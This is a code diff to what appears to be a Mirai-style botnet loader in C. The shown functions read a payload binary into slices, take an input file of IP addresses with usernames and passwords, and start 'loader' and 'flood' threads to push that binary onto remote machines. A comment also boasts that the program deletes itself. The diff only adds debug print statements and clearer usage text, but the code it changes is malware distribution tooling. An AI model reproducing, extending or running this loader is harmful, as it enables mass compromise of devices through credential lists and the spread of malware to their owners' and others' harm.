@@ -886,15 +886,19 @@ void *loader(void *threadCount)
 
 int load_binary(char *path)
 {
+    printf("Loading binary %s...\n", path);
     // /proc/self/exe still works even when we delete ourselves l0l
     int fd, size = 0, got = 0, i, slice = 0;
     unsigned char ch;
-    
+
+    printf("Finding size of binary...\n");
     if ((fd = open(path, O_RDONLY)) == -1)
         return -1;
+    printf("Opened binary\n");
     while ((got = read(fd, &ch, 1)) > 0) size++;
     close(fd);
-    
+
+    printf("Allocating memory for binary...\n");
     binary.num_slices = (int) ceil(size / (float)BYTES_PER_LINE);
     binary.slices = calloc(binary.num_slices, sizeof(unsigned char *));
     if (binary.slices == NULL)
@@ -906,7 +910,8 @@ int load_binary(char *path)
         if (binary.slices[i] == NULL)
             return -1;
     }
-    
+
+    printf("Reading binary...\n");
     if ((fd = open(path, O_RDONLY)) == -1)
         return -1;
     do
@@ -930,35 +935,44 @@ int main(int argc, char *argv[ ])
 {
     if(argc < 4){
         fprintf(stderr, "Invalid parameters!\n");
-        fprintf(stdout, "Usage: %s <bind ip> <input file> <file_to_load> <argument> <threads> <connections> (debug mode)\n", argv[0]);
+        fprintf(stdout, "Usage: %s <bind ip> <input file> <absolute path to file_to_load> <argument> <threads> <connections> (debug mode)\n", argv[0]);
+        fprintf(stdout, "Input file: <ip>:<user>:<pass>\n");
         exit(-1);
     }
-    
+
     signal(SIGPIPE, SIG_IGN);
-    
+
     epollFD = epoll_create(0xDEAD);
     bind_ip = argv[1];
+    printf("Bound IP\n");
     infd = fopen(argv[2], "r");
+    printf("Opened input file\n");
     signal(SIGINT, &sighandler);
     int threads = atoi(argv[5]);
     maxConnectedSockets = atoi(argv[6]);
+    printf("Starting...\n");
     
-    if (argc == 8)
+    if (argc == 8) {
         debug_mode = 1;
-    
+        printf("DEBUG MODE\n");
+    }
+
     int i;
     for(i = 0; i < (1024 * 100); i++)
     {
         pthread_mutex_init(&stateTable[i].mutex, NULL);
     }
+    printf("Initialized mutexes\n");
 
     load_binary(argv[3]);
+    printf("Loaded binary\n");
     run_arg = argv[4];
 
     pthread_t thread;
     pthread_create( &thread, NULL, &loader, (void *) &threads);
 
     for(i = 0; i < threads; i++) pthread_create( &thread, NULL, &flood, (void *) NULL);
+    printf("Created threads\n");
 
     char timeText[100];
     time_t now = time(NULL);
